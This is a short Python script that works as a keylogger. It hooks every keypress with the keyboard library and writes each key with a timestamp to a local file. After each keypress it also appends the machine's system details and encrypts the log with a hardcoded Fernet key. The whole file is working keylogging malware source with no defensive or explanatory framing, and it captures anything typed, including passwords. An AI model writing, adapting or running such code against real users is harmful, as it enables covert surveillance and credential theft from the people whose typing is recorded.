from cryptography.fernet import Fernet
import keyboard
import datetime
import platform

# Your secret key for encryption. Keep this secure.
encryption_key = b'qoW3PipWdH6pgbsERsnPbLptNh5LvUsVPlUpMG4CHsQ='

keylog_file = 'keystrokes.txt'
encrypted_file = 'encrypted_keystrokes.txt'

# Initialize the Fernet cipher with the encryption key
cipher = Fernet(encryption_key)

def log_system_info():
    system_info = platform.uname()
    with open(keylog_file, 'a') as file:
        file.write("System Information:\n")
        file.write(f"System: {system_info.system}\n")
        file.write(f"Node Name: {system_info.node}\n")
        file.write(f"Release: {system_info.release}\n")
        file.write(f"Version: {system_info.version}\n")
        file.write(f"Machine: {system_info.machine}\n")
        file.write(f"Processor: {system_info.processor}\n")
        file.write("\n")

def encrypt_file(filename):
    with open(filename, 'rb') as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(encrypted_file, 'wb') as file:
        file.write(encrypted_data)

def on_press(event):
    with open(keylog_file, 'a') as file:
        # Log timestamp and the pressed key
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"[{timestamp}] {event.name}\n")
    log_system_info()
    # Encrypt the log file
    encrypt_file(keylog_file)

keyboard.on_press(on_press)

keyboard.wait()
